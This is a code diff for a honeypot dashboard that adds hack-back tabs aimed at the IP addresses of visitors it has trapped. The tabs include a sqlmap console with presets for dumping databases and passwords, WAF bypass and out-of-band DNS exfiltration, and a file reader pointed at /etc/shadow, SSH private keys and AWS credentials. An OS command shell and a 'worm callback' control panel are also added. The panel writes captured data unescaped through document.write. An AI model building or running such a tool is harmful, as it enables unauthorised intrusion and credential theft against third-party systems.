@@ -9,6 +9,7 @@ import { useToast } from "@/hooks/use-toast";
 import {
   Network, Skull, ShieldAlert, Bug, Loader2, XCircle,
   Copy, Search, ChevronDown, Syringe, Globe, TerminalSquare, Download,
+  FolderOpen, Terminal, MonitorSmartphone, RefreshCw, FileText,
 } from "lucide-react";
 import { format } from "date-fns";
 
@@ -144,7 +145,7 @@ type AttackerRow = {
   sqlmapFinishedAt?: string | null;
 };
 
-type PanelTab = "portscan" | "sqlmap";
+type PanelTab = "portscan" | "sqlmap" | "console" | "files" | "osshell" | "control";
 
 // ── IP address dropdown menu ──────────────────────────────────────────────────
 function IpDropdown({
@@ -494,6 +495,37 @@ function AttackerCommandPanel({
   const [sqlJobId, setSqlJobId]   = useState<string | null>(attacker.sqlmapJobId ?? null);
   const [sqlStatus, setSqlStatus] = useState(attacker.sqlmapStatus ?? "idle");
 
+  // ── Console state (custom sqlmap) ─────────────────────────────────────────
+  const [consoleFlags, setConsoleFlags] = useState(
+    `--level=5 --risk=3 --dbs --tables --users --passwords --dump-all`
+  );
+  const [consoleRunning, setConsoleRunning] = useState(false);
+  const [consoleOutput, setConsoleOutput]   = useState<string | null>(null);
+  const [consoleJobId, setConsoleJobId]     = useState<string | null>(null);
+  const [consoleCmd, setConsoleCmd]         = useState<string | null>(null);
+
+  // ── File manager state ────────────────────────────────────────────────────
+  const [filePath, setFilePath]     = useState("/etc/passwd");
+  const [fileRunning, setFileRunning] = useState(false);
+  const [fileOutput, setFileOutput]   = useState<string | null>(null);
+  const [fileJobId, setFileJobId]     = useState<string | null>(null);
+
+  // ── OS Shell state ────────────────────────────────────────────────────────
+  const [osCmd, setOsCmd]         = useState("id && uname -a && whoami && hostname");
+  const [osRunning, setOsRunning] = useState(false);
+  const [osOutput, setOsOutput]   = useState<string | null>(null);
+  const [osJobId, setOsJobId]     = useState<string | null>(null);
+  const [osHistory, setOsHistory] = useState<{ cmd: string; out: string }[]>([]);
+
+  // ── Control panel state ───────────────────────────────────────────────────
+  interface WormCallback { ts: string; ua?: string; ref?: string; wormId?: string }
+  interface ControlData {
+    wormCallbacks: WormCallback[]; banner?: string; rawRequest?: string; nodeRegion?: string;
+    sqlmapStatus?: string; sqlmapResults?: string; loopCount?: number;
+  }
+  const [controlData, setControlData] = useState<ControlData | null>(null);
+  const [controlLoading, setControlLoading] = useState(false);
+
   const switchTab = (t: PanelTab) => { setTab(t); onTabChange(t); };
 
   const runPortScan = async () => {
@@ -570,6 +602,109 @@ function AttackerCommandPanel({
     }
   };
 
+  // ── Console: custom sqlmap command ───────────────────────────────────────
+  const runConsole = async () => {
+    setConsoleRunning(true);
+    setConsoleOutput(null);
+    setConsoleCmd(null);
+    try {
+      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ customFlags: consoleFlags, targetUrl: sqlTarget }),
+      });
+      const data = await res.json();
+      if (!res.ok) { toast({ title: "Console Error", description: data.error, variant: "destructive" }); setConsoleRunning(false); return; }
+      setConsoleJobId(data.jobId);
+      setConsoleCmd(data.cmd);
+      toast({ title: "SQLmap Console Running", description: `Job ${data.jobId}` });
+      const poll = setInterval(async () => {
+        try {
+          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom/${data.jobId}`);
+          const pd = await pr.json();
+          if (pd.status !== "running") { setConsoleOutput(pd.results ?? "No output"); setConsoleRunning(false); clearInterval(poll); }
+        } catch { /* ignore */ }
+      }, 4000);
+    } catch (e: any) { setConsoleOutput("Error: " + e.message); setConsoleRunning(false); }
+  };
+
+  // ── File manager: --file-read ─────────────────────────────────────────────
+  const runFileRead = async (path?: string) => {
+    const target = path ?? filePath;
+    setFilePath(target);
+    setFileRunning(true);
+    setFileOutput(null);
+    try {
+      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/file-read`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ filePath: target, targetUrl: sqlTarget }),
+      });
+      const data = await res.json();
+      if (!res.ok) { toast({ title: "File Read Error", description: data.error, variant: "destructive" }); setFileRunning(false); return; }
+      setFileJobId(data.jobId);
+      toast({ title: "File Read Initiated", description: target });
+      const poll = setInterval(async () => {
+        try {
+          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/file-read/${data.jobId}`);
+          const pd = await pr.json();
+          if (pd.status !== "running") { setFileOutput(pd.results ?? "No output"); setFileRunning(false); clearInterval(poll); }
+        } catch { /* ignore */ }
+      }, 4000);
+    } catch (e: any) { setFileOutput("Error: " + e.message); setFileRunning(false); }
+  };
+
+  const downloadFileOutput = () => {
+    if (!fileOutput) return;
+    const blob = new Blob([fileOutput], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url; a.download = `${attacker.ip}-${filePath.replace(/[^a-zA-Z0-9.]/g, "_")}.txt`;
+    a.click(); URL.revokeObjectURL(url);
+  };
+
+  // ── OS Shell: --os-cmd ────────────────────────────────────────────────────
+  const runOsCmd = async () => {
+    setOsRunning(true);
+    setOsOutput(null);
+    try {
+      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/os-cmd`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ osCmd, targetUrl: sqlTarget }),
+      });
+      const data = await res.json();
+      if (!res.ok) { toast({ title: "OS Cmd Error", description: data.error, variant: "destructive" }); setOsRunning(false); return; }
+      setOsJobId(data.jobId);
+      toast({ title: "OS Command Sent", description: osCmd });
+      const poll = setInterval(async () => {
+        try {
+          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/os-cmd/${data.jobId}`);
+          const pd = await pr.json();
+          if (pd.status !== "running") {
+            setOsOutput(pd.results ?? "No output");
+            setOsHistory(h => [{ cmd: osCmd, out: pd.results ?? "" }, ...h].slice(0, 20));
+            setOsRunning(false); clearInterval(poll);
+          }
+        } catch { /* ignore */ }
+      }, 4000);
+    } catch (e: any) { setOsOutput("Error: " + e.message); setOsRunning(false); }
+  };
+
+  // ── Control panel: load intelligence data ──────────────────────────────────
+  const loadControlData = useCallback(async () => {
+    setControlLoading(true);
+    try {
+      const r = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/control-data`);
+      const d = await r.json();
+      if (r.ok) setControlData(d);
+    } catch { /* ignore */ } finally { setControlLoading(false); }
+  }, [attacker.id, authFetch]);
+
+  useEffect(() => {
+    if (tab === "control" && !controlData) loadControlData();
+  }, [tab, controlData, loadControlData]);
+
   const statusBadge = (s: string) => {
     const map: Record<string, string> = {
       idle: "text-primary/40", running: "text-yellow-400 animate-pulse",
@@ -604,36 +739,53 @@ function AttackerCommandPanel({
       </div>
 
       {/* Tab bar */}
-      <div className="flex border-b border-yellow-500/20 shrink-0">
-        <button
-          onClick={() => switchTab("portscan")}
-          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-mono uppercase tracking-widest border-b-2 transition-colors ${
-            tab === "portscan"
-              ? "border-primary text-primary bg-primary/5"
-              : "border-transparent text-primary/40 hover:text-primary/70"
-          }`}
-        >
-          <Search className="w-3.5 h-3.5" />
-          Port Scan
-        </button>
-        <button
-          onClick={() => switchTab("sqlmap")}
-          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-mono uppercase tracking-widest border-b-2 transition-colors ${
-            tab === "sqlmap"
-              ? "border-red-500 text-red-400 bg-red-500/5"
-              : "border-transparent text-primary/40 hover:text-red-400/60"
-          }`}
-        >
-          <Syringe className="w-3.5 h-3.5" />
-          SQLmap Injection
-          {sqlStatus === "running" && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
-          {sqlStatus === "complete" && <span className="w-1.5 h-1.5 rounded-full bg-primary" />}
-        </button>
-        <div className="ml-auto flex items-center px-3">
+      <div className="flex border-b border-yellow-500/20 shrink-0 overflow-x-auto">
+        {([
+          { id: "portscan",  icon: Search,          label: "Port Scan",  color: "primary" },
+          { id: "sqlmap",    icon: Syringe,         label: "Inject",     color: "red" },
+          { id: "console",   icon: TerminalSquare,  label: "SQL Console",color: "orange" },
+          { id: "files",     icon: FolderOpen,      label: "File Manager",color: "yellow" },
+          { id: "osshell",   icon: Terminal,        label: "OS Shell",   color: "purple" },
+          { id: "control",   icon: MonitorSmartphone, label: "Control Panel", color: "cyan" },
+        ] as const).map(({ id, icon: Icon, label, color }) => {
+          const colorMap: Record<string, string> = {
+            primary: "border-primary text-primary bg-primary/5",
+            red:     "border-red-500 text-red-400 bg-red-500/5",
+            orange:  "border-orange-500 text-orange-400 bg-orange-500/5",
+            yellow:  "border-yellow-500 text-yellow-400 bg-yellow-500/5",
+            purple:  "border-purple-500 text-purple-400 bg-purple-500/5",
+            cyan:    "border-cyan-500 text-cyan-400 bg-cyan-500/5",
+          };
+          const hoverMap: Record<string, string> = {
+            primary: "hover:text-primary/70",
+            red:     "hover:text-red-400/60",
+            orange:  "hover:text-orange-400/60",
+            yellow:  "hover:text-yellow-400/60",
+            purple:  "hover:text-purple-400/60",
+            cyan:    "hover:text-cyan-400/60",
+          };
+          return (
+            <button
+              key={id}
+              onClick={() => switchTab(id)}
+              className={`flex items-center gap-1.5 px-3 py-2.5 text-[10px] font-mono uppercase tracking-widest border-b-2 transition-colors whitespace-nowrap ${
+                tab === id ? colorMap[color] : `border-transparent text-primary/40 ${hoverMap[color]}`
+              }`}
+            >
+              <Icon className="w-3 h-3" />
+              {label}
+              {id === "sqlmap" && sqlStatus === "running" && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
+              {id === "sqlmap" && sqlStatus === "complete" && <span className="w-1.5 h-1.5 rounded-full bg-primary" />}
+              {id === "console" && consoleRunning && <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />}
+              {id === "files"   && fileRunning   && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
+              {id === "osshell" && osRunning     && <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-pulse" />}
+            </button>
+          );
+        })}
+        <div className="ml-auto flex items-center px-3 shrink-0">
           <a
             href={`https://search.arin.net/rdap/?query=${attacker.ip}`}
-            target="_blank"
-            rel="noopener noreferrer"
+            target="_blank" rel="noopener noreferrer"
             className="flex items-center gap-1.5 text-[10px] font-mono text-blue-400/60 hover:text-blue-400 transition-colors border border-blue-500/20 hover:border-blue-500/50 px-2 py-1 rounded"
           >
             <Globe className="w-3 h-3" />
@@ -794,6 +946,359 @@ function AttackerCommandPanel({
                 <Loader2 className="w-3.5 h-3.5 animate-spin" />
                 SQLmap scanning {attacker.ip} — polling every 4s for results…
               </div>
+            )}
+          </div>
+        )}
+
+        {/* ── SQL CONSOLE TAB ── */}
+        {tab === "console" && (
+          <div className="space-y-4">
+            <div className="text-[10px] font-mono text-orange-400/60 border border-orange-500/15 rounded px-3 py-2 bg-orange-500/5">
+              Full SQLmap console — runs <span className="text-orange-400">sqlmap -u "{sqlTarget}" --batch [your flags]</span>. Any SQLmap flag is supported.
+            </div>
+
+            <div>
+              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Target URL (shared with Inject tab)</label>
+              <input value={sqlTarget} onChange={e => setSqlTarget(e.target.value)}
+                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded"
+                placeholder={`http://${attacker.ip}/`} />
+            </div>
+
+            <div>
+              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">SQLmap Flags (full control)</label>
+              <textarea value={consoleFlags} onChange={e => setConsoleFlags(e.target.value)} rows={4}
+                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded resize-y"
+                placeholder="--level=5 --risk=3 --dbs --dump-all --users --passwords" />
+            </div>
+
+            <div className="grid grid-cols-2 gap-2">
+              {[
+                { label: "Full Dump",          flags: "--level=5 --risk=3 --dbs --tables --dump-all" },
+                { label: "Credentials",        flags: "--users --passwords --privilege" },
+                { label: "Blind + Error",      flags: "--technique=BE --level=4 --risk=3 --dbs" },
+                { label: "WAF Bypass",         flags: "--tamper=space2comment,between --random-agent --level=3" },
+                { label: "Stacked Queries",    flags: "--technique=S --level=3 --risk=2 --dbs" },
+                { label: "Second Order",       flags: "--second-url=http://"+attacker.ip+"/profile --dbs" },
+                { label: "Banner + Version",   flags: "--banner --current-db --current-user --hostname --dbs" },
+                { label: "OOB (DNS)",          flags: "--dns-domain=oob.proxhqvpn.com --dbs --level=3" },
+              ].map(({ label, flags }) => (
+                <button key={label} onClick={() => setConsoleFlags(flags)}
+                  className="flex flex-col items-start px-2.5 py-2 border border-orange-500/20 text-left hover:border-orange-500/50 hover:bg-orange-500/5 transition-colors rounded">
+                  <span className="text-orange-400/80 text-[10px] font-mono font-semibold">{label}</span>
+                </button>
+              ))}
+            </div>
+
+            <div className="flex items-center gap-3">
+              <button onClick={runConsole} disabled={consoleRunning}
+                className="flex items-center gap-2 px-4 py-2 border border-orange-500/50 text-orange-400 text-xs font-mono uppercase hover:bg-orange-500/10 hover:border-orange-500 transition-colors disabled:opacity-40 rounded">
+                {consoleRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <TerminalSquare className="w-3.5 h-3.5" />}
+                {consoleRunning ? "Running…" : "Execute Command"}
+              </button>
+              {consoleJobId && <span className="text-[10px] text-primary/30 font-mono">JOB:{consoleJobId}</span>}
+            </div>
+
+            {consoleCmd && (
+              <div className="text-[10px] font-mono text-orange-400/30 bg-black border border-orange-500/10 px-2 py-1.5 rounded overflow-x-auto whitespace-nowrap">
+                $ {consoleCmd}
+              </div>
+            )}
+            {consoleOutput && (
+              <div className="relative">
+                <div className="bg-black border border-orange-500/15 p-3 text-[11px] font-mono text-orange-300/75 max-h-[32rem] overflow-auto whitespace-pre-wrap rounded">
+                  {consoleOutput}
+                </div>
+                <button onClick={() => { const b = new Blob([consoleOutput], { type: "text/plain" }); const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = `sqlmap-console-${attacker.ip}.txt`; a.click(); URL.revokeObjectURL(u); }}
+                  className="absolute top-2 right-2 flex items-center gap-1 px-2 py-1 border border-orange-500/30 text-orange-400/60 text-[9px] font-mono hover:text-orange-400 hover:border-orange-500/60 rounded bg-black">
+                  <Download className="w-3 h-3" /> Save
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ── FILE MANAGER TAB ── */}
+        {tab === "files" && (
+          <div className="space-y-4">
+            <div className="text-[10px] font-mono text-yellow-400/60 border border-yellow-500/15 rounded px-3 py-2 bg-yellow-500/5">
+              Reads files from the attacker's system via <span className="text-yellow-400">sqlmap --file-read</span>. Requires SQLi to be exploitable on the target.
+            </div>
+
+            <div className="flex gap-2">
+              <input value={filePath} onChange={e => setFilePath(e.target.value)}
+                className="flex-1 bg-black border border-yellow-500/25 text-yellow-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-yellow-500/60 rounded"
+                placeholder="/etc/passwd" />
+              <button onClick={() => runFileRead()} disabled={fileRunning}
+                className="flex items-center gap-2 px-4 py-1.5 border border-yellow-500/50 text-yellow-400 text-xs font-mono hover:bg-yellow-500/10 hover:border-yellow-500 transition-colors disabled:opacity-40 rounded">
+                {fileRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <FolderOpen className="w-3.5 h-3.5" />}
+                {fileRunning ? "Reading…" : "Read File"}
+              </button>
+            </div>
+
+            <div>
+              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Linux Quick Access</div>
+              <div className="flex flex-wrap gap-1.5">
+                {["/etc/passwd","/etc/shadow","/etc/hosts","/etc/crontab","/root/.ssh/id_rsa",
+                  "/root/.ssh/authorized_keys","/root/.bash_history","/home/ubuntu/.bash_history",
+                  "/proc/version","/etc/issue","/var/log/auth.log","/etc/sudoers",
+                  "/root/.aws/credentials","/home/ubuntu/.aws/credentials",
+                ].map(p => (
+                  <button key={p} onClick={() => runFileRead(p)} disabled={fileRunning}
+                    className="px-2 py-0.5 border border-yellow-500/20 text-yellow-400/60 text-[9px] font-mono hover:border-yellow-500/50 hover:text-yellow-400 disabled:opacity-40 rounded transition-colors">
+                    {p}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            <div>
+              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Windows Quick Access</div>
+              <div className="flex flex-wrap gap-1.5">
+                {["C:\\Windows\\System32\\drivers\\etc\\hosts","C:\\Windows\\System32\\drivers\\etc\\networks",
+                  "C:\\Users\\Administrator\\Desktop\\passwords.txt","C:\\inetpub\\wwwroot\\web.config",
+                  "C:\\Windows\\win.ini","C:\\boot.ini",
+                ].map(p => (
+                  <button key={p} onClick={() => runFileRead(p)} disabled={fileRunning}
+                    className="px-2 py-0.5 border border-yellow-500/20 text-yellow-400/60 text-[9px] font-mono hover:border-yellow-500/50 hover:text-yellow-400 disabled:opacity-40 rounded transition-colors">
+                    {p}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {fileJobId && !fileOutput && fileRunning && (
+              <div className="flex items-center gap-2 text-yellow-400 text-xs font-mono border border-yellow-500/20 rounded px-3 py-2">
+                <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                Reading {filePath} via SQLi… polling every 4s
+              </div>
+            )}
+            {fileOutput && (
+              <div className="relative">
+                <div className="flex items-center justify-between mb-1">
+                  <span className="text-[10px] font-mono text-yellow-400/60">{filePath}</span>
+                  <button onClick={downloadFileOutput}
+                    className="flex items-center gap-1 px-2 py-0.5 border border-yellow-500/30 text-yellow-400/60 text-[9px] font-mono hover:text-yellow-400 rounded">
+                    <Download className="w-3 h-3" /> Download
+                  </button>
+                </div>
+                <div className="bg-black border border-yellow-500/15 p-3 text-[11px] font-mono text-yellow-200/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
+                  {fileOutput}
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ── OS SHELL TAB ── */}
+        {tab === "osshell" && (
+          <div className="space-y-4">
+            <div className="text-[10px] font-mono text-purple-400/60 border border-purple-500/15 rounded px-3 py-2 bg-purple-500/5">
+              Executes OS commands on <span className="text-purple-400">{attacker.ip}</span> via <span className="text-purple-400">sqlmap --os-cmd</span>. Requires OS command execution capability through SQLi.
+            </div>
+
+            <div className="flex gap-2">
+              <input value={osCmd} onChange={e => setOsCmd(e.target.value)}
+                onKeyDown={e => { if (e.key === "Enter" && !osRunning) runOsCmd(); }}
+                className="flex-1 bg-black border border-purple-500/25 text-purple-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-purple-500/60 rounded"
+                placeholder="id && whoami && uname -a" />
+              <button onClick={runOsCmd} disabled={osRunning}
+                className="flex items-center gap-2 px-4 py-1.5 border border-purple-500/50 text-purple-400 text-xs font-mono hover:bg-purple-500/10 hover:border-purple-500 transition-colors disabled:opacity-40 rounded">
+                {osRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Terminal className="w-3.5 h-3.5" />}
+                {osRunning ? "Running…" : "Execute"}
+              </button>
+            </div>
+
+            <div className="flex flex-wrap gap-1.5">
+              {["id && whoami && hostname","uname -a","cat /etc/passwd","cat /etc/shadow","ps aux | head -30",
+                "netstat -tulpn","ls -la /root","cat /root/.bash_history","env","crontab -l",
+                "find / -perm -4000 -type f 2>/dev/null","ss -tulpn","w","last -20",
+                "iptables -L -n","cat /etc/crontab",
+              ].map(cmd => (
+                <button key={cmd} onClick={() => setOsCmd(cmd)}
+                  className="px-2 py-0.5 border border-purple-500/20 text-purple-400/60 text-[9px] font-mono hover:border-purple-500/50 hover:text-purple-400 rounded transition-colors">
+                  {cmd}
+                </button>
+              ))}
+            </div>
+
+            {osRunning && (
+              <div className="flex items-center gap-2 text-purple-400 text-xs font-mono border border-purple-500/20 rounded px-3 py-2">
+                <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                Executing OS command via SQLi — polling every 4s…
+              </div>
+            )}
+
+            {/* Command history */}
+            {osHistory.length > 0 && (
+              <div className="space-y-2">
+                <div className="text-[10px] text-primary/30 font-mono uppercase">Command History ({osHistory.length})</div>
+                {osHistory.map((entry, i) => (
+                  <div key={i} className="border border-purple-500/10 rounded overflow-hidden">
+                    <div className="flex items-center gap-2 px-2 py-1 bg-purple-500/5 border-b border-purple-500/10">
+                      <Terminal className="w-3 h-3 text-purple-400/50" />
+                      <span className="text-[10px] font-mono text-purple-400/70 flex-1">{entry.cmd}</span>
+                      <button onClick={() => setOsCmd(entry.cmd)} className="text-[9px] font-mono text-purple-400/40 hover:text-purple-400">re-run</button>
+                    </div>
+                    <div className="p-2 bg-black text-[11px] font-mono text-purple-200/60 max-h-32 overflow-auto whitespace-pre-wrap">
+                      {entry.out.substring(0, 2000)}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {osOutput && osHistory.length === 0 && (
+              <div className="bg-black border border-purple-500/15 p-3 text-[11px] font-mono text-purple-300/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
+                {osOutput}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ── CONTROL PANEL TAB ── */}
+        {tab === "control" && (
+          <div className="space-y-4">
+            <div className="flex items-center justify-between">
+              <div className="text-[10px] font-mono text-cyan-400/60 border border-cyan-500/15 rounded px-3 py-2 bg-cyan-500/5 flex-1 mr-3">
+                Full intelligence dashboard for <span className="text-cyan-400">{attacker.ip}</span> — worm callbacks, request data, exploitation summary.
+              </div>
+              <button onClick={loadControlData} disabled={controlLoading}
+                className="flex items-center gap-1.5 px-3 py-2 border border-cyan-500/30 text-cyan-400 text-[10px] font-mono hover:bg-cyan-500/10 hover:border-cyan-500/60 transition-colors disabled:opacity-40 rounded shrink-0">
+                {controlLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
+                Refresh
+              </button>
+            </div>
+
+            {controlLoading && !controlData && (
+              <div className="flex items-center gap-2 text-cyan-400 text-xs font-mono border border-cyan-500/20 rounded px-3 py-2">
+                <Loader2 className="w-3.5 h-3.5 animate-spin" />Loading intelligence data…
+              </div>
+            )}
+
+            {controlData && (
+              <div className="space-y-3">
+                {/* Identity block */}
+                <div className="border border-cyan-500/20 rounded overflow-hidden">
+                  <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Target Identity</div>
+                  <div className="p-3 grid grid-cols-2 gap-2 text-[11px] font-mono">
+                    {[
+                      ["IP Address", attacker.ip],
+                      ["Region", controlData.nodeRegion ?? "Unknown"],
+                      ["Honeypot Port", attacker.honeypotPort ?? "—"],
+                      ["Probe Type", attacker.probeType ?? "—"],
+                      ["Loop Count", controlData.loopCount?.toString() ?? "0"],
+                      ["SQLmap Status", controlData.sqlmapStatus ?? "idle"],
+                    ].map(([k, v]) => (
+                      <div key={k}>
+                        <div className="text-primary/30 text-[9px] uppercase">{k}</div>
+                        <div className="text-cyan-300">{v}</div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Worm callbacks */}
+                {controlData.wormCallbacks.length > 0 && (
+                  <div className="border border-cyan-500/20 rounded overflow-hidden">
+                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest flex items-center gap-2">
+                      <span>Worm Callbacks</span>
+                      <span className="border border-cyan-500/40 px-1.5 rounded text-cyan-300">{controlData.wormCallbacks.length}</span>
+                    </div>
+                    <div className="max-h-48 overflow-auto divide-y divide-cyan-500/10">
+                      {controlData.wormCallbacks.map((cb, i) => (
+                        <div key={i} className="px-3 py-2 space-y-1">
+                          <div className="flex items-center gap-3 text-[9px] font-mono text-primary/40">
+                            <span>{new Date(cb.ts).toLocaleString()}</span>
+                            {cb.wormId && <span className="text-cyan-400/40">WORM:{cb.wormId}</span>}
+                          </div>
+                          {cb.ua && <div className="text-[10px] font-mono text-cyan-300/60 truncate">{cb.ua}</div>}
+                          {cb.ref && <div className="text-[9px] font-mono text-cyan-400/40">ref: {cb.ref}</div>}
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {/* Raw request */}
+                {controlData.rawRequest && (
+                  <div className="border border-cyan-500/20 rounded overflow-hidden">
+                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Captured Raw Request</div>
+                    <div className="p-3 bg-black text-[10px] font-mono text-cyan-200/60 max-h-32 overflow-auto whitespace-pre-wrap">{controlData.rawRequest}</div>
+                  </div>
+                )}
+
+                {/* Banner */}
+                {controlData.banner && (
+                  <div className="border border-cyan-500/20 rounded overflow-hidden">
+                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Worm Banner Injected</div>
+                    <div className="p-3 bg-black text-[10px] font-mono text-cyan-200/60 max-h-32 overflow-auto whitespace-pre-wrap">{controlData.banner}</div>
+                  </div>
+                )}
+
+                {/* SQLmap summary */}
+                {controlData.sqlmapResults && (
+                  <div className="border border-red-500/20 rounded overflow-hidden">
+                    <div className="px-3 py-2 bg-red-500/10 text-[10px] font-mono text-red-400 uppercase tracking-widest flex items-center gap-2">
+                      <FileText className="w-3 h-3" /> SQLmap Results
+                    </div>
+                    <div className="p-3 bg-black text-[10px] font-mono text-red-300/60 max-h-48 overflow-auto whitespace-pre-wrap">{controlData.sqlmapResults.substring(0, 4000)}</div>
+                  </div>
+                )}
+
+                {/* Open full HTML control window */}
+                <button
+                  onClick={() => {
+                    const html = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>ProxhqVPN — Control Panel: ${attacker.ip}</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#050505;color:#e0e0e0;font-family:monospace;font-size:12px}
+  h1{color:#00ff88;font-size:18px;padding:16px;border-bottom:1px solid #00ff8820;background:#00ff8808}
+  .row{display:flex;gap:0;border-bottom:1px solid #111}
+  .cell{padding:8px 16px;flex:1;border-right:1px solid #111;overflow:auto}
+  .label{color:#555;font-size:10px;text-transform:uppercase;margin-bottom:4px}
+  .val{color:#00ff88}
+  pre{white-space:pre-wrap;word-break:break-word;color:#aaa;font-size:11px;max-height:200px;overflow:auto}
+  section{margin:16px;border:1px solid #0f0f0f;border-radius:4px;overflow:hidden}
+  .sec-head{background:#111;color:#00ff88;padding:8px 12px;font-size:10px;text-transform:uppercase;letter-spacing:2px}
+  .callbacks{max-height:200px;overflow:auto}
+  .cb{border-bottom:1px solid #0f0f0f;padding:8px 12px;font-size:10px}
+  .cb .ts{color:#555}.cb .ua{color:#00dd77;margin-top:2px}
+</style>
+</head>
+<body>
+<h1>🕸️ ProxhqVPN — Attacker Control Panel: ${attacker.ip}</h1>
+<section>
+<div class="sec-head">Identity</div>
+<div class="row">
+  <div class="cell"><div class="label">IP</div><div class="val">${attacker.ip}</div></div>
+  <div class="cell"><div class="label">Region</div><div class="val">${controlData.nodeRegion ?? "Unknown"}</div></div>
+  <div class="cell"><div class="label">Honeypot Port</div><div class="val">${attacker.honeypotPort ?? "—"}</div></div>
+  <div class="cell"><div class="label">Loop Count</div><div class="val">${controlData.loopCount ?? 0}</div></div>
+</div>
+</section>
+${controlData.rawRequest ? `<section><div class="sec-head">Captured Request</div><div style="padding:12px"><pre>${controlData.rawRequest}</pre></div></section>` : ""}
+${controlData.wormCallbacks.length > 0 ? `<section><div class="sec-head">Worm Callbacks (${controlData.wormCallbacks.length})</div><div class="callbacks">${controlData.wormCallbacks.map(cb => `<div class="cb"><span class="ts">${new Date(cb.ts).toLocaleString()}</span>${cb.ua ? `<div class="ua">${cb.ua}</div>` : ""}</div>`).join("")}</div></section>` : ""}
+${controlData.sqlmapResults ? `<section><div class="sec-head">SQLmap Results</div><div style="padding:12px"><pre>${controlData.sqlmapResults.substring(0, 8000)}</pre></div></section>` : ""}
+<section><div class="sec-head">Worm Banner</div><div style="padding:12px"><pre>${controlData.banner ?? "No banner captured"}</pre></div></section>
+</body></html>`;
+                    const w = window.open("", "_blank", "width=1100,height=800,menubar=0,toolbar=0");
+                    w?.document.write(html);
+                    w?.document.close();
+                  }}
+                  className="w-full flex items-center justify-center gap-2 px-4 py-3 border border-cyan-500/40 text-cyan-400 text-xs font-mono uppercase hover:bg-cyan-500/10 hover:border-cyan-500 transition-colors rounded"
+                >
+                  <MonitorSmartphone className="w-4 h-4" />
+                  Open Full HTML Control Panel in New Window
+                </button>
+              </div>
+            )}
+
+            {!controlData && !controlLoading && (
+              <div className="text-center py-8 text-primary/30 font-mono text-xs">Click Refresh to load intelligence data</div>
             )}
           </div>
         )}
